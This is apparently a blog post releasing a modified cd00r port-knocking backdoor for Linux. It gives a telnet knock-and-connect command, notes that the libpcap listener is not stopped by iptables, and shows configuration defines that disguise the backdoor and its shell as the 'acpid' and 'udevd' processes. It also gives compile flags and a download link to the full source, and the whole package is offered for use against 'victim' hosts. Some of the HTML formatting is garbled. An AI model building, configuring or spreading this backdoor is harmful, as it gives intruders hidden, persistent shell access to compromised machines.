#1. Introduction 
Standard backdoors and remote access services have one major drawback: The port’s they are listening on are visible on the system console as well as from outside (through port scanning).
 
 
One of my favorite backdoor is called cd00r (from phenoelit.de). This backdoor will not listen on any port until you send a sequence of TCP SYN packets  on a defined port list, and in the correct order. Once the correct list of SYN packet is received by the compromised host, a shell will spawn on a (hard-coded) TCP port, and will wait for you. Brilliant !
 
 
In order to successfully use this backdoor, you need at least one TCP port unused and unfiltered by firewall to allow the shell to listen on the network. That port must be seen as “closed” from a port scan.
 
 
I’ve decided to improve a bit the backdoor for my self usage.  Because I’m a nice guy, I choose to share it with you.
 
 
•  First, we will remove the hard-coded listening port and let you choose the port dynamically. How ? simply by providing the listening port at the end of the knocking ports list. So basically, you will have to send your defined list of SYN packets to the victim, and then send the port number you’d like to use for the remote shell.


• Secondly, we rewrote the shell part of code to use pseudo-terminal (PTY). Giving us a chance to work on more recent Linux distribution.


#2. Example of usage 

sh:

\# t="telnet host.victim.com"


\# <span style="color:red;">$t 999; $t 888; $t 777 ; $t 666; $t 555;</table> $t <span style="color:green;">12345</span>  ; sleep 1 ; $t <span style="color:blue;">12345</span> 



In <span style="color:red;">red</span>: The knocking SYN phase. We will send SYN packets on port 999, 888, 777, 666 and 555

In <span style="color:green;">green</span>: The port choose for spawning a shell on. In this case 12345


In <span style="color:blue;">blue</span>: The connection to that shell (on port 12345). Note the “sleep 1″ before the connection, it is simply to give extra time to the backdoor to start the shell.

 
#3. What about Firewall ?

There is a good and a bad news here.

Regarding the knocking ports, you don’t need to use unfiltered ports on the victim host. Because the backdoor use libpcap to listen to your SYN packets, and that this listening phase occurs on layer 2 of the TCP/IP stack (data-link). The process will be able to see your packets coming even if iptables is running.

The bad news is, you still need a non-filtered and non-used port for the shell (from a port scanning view, the port must be seen as “closed“).

Another aspect that you must keep in mind is that the knocking SYN packet must be sent in the correct order and without any packet retransmission (because it will break the sequence). This is important to remember when the knocking ports are filtered (dropped) by a firewall (even they will be seen by the backdoor). Indeed, telnet (or equivalent) will resent a new SYN packet after a few seconds because no SYN-ACK are received from the host. Thus, when these ports are filtered/dropped, you just have to hit Ctrl-C after each emission during the red phase of the example showed in section 2.

#4. The source code 

```cpp
#define CDR_INTERFACE       "eth0"             // The interface when to listen<br/>
#define CDR_ADDRESS     "192.168.100.1"   // The ip address of the victim<br/>
#define CDR_PORTS       { 999,888,777,666,555,00 }  // The knocking port list, must end by 00.<br/>
```


Download: <a href="https://funoverip.net/wp-content/uploads/2011/03/cd00r.c.gz">cd00r.c.gz</a>
 
The only thing you must edit are the following definitions:

```cpp
#define CDR_INTERFACE       "eth0"             // The interface when to listen
#define CDR_ADDRESS     "192.168.100.1"   // The ip address of the victim
#define CDR_PORTS       { 999,888,777,666,555,00 }  // The knocking port list, must end by 00.
```

The only thing you could edit are the following definitions:
```cpp
#define MASK_DEAMON     "acpid"    // process name of the backdoor
#define MASK_SHELL  "udevd"    // process name of the shell (when run)
```

To compile the code, you need libpcap devel package (libpcap-dev) and add "-DUSE_PCAP -lpcap" to gcc. You may add "-DDEBUG" aswell for debugging purpose.
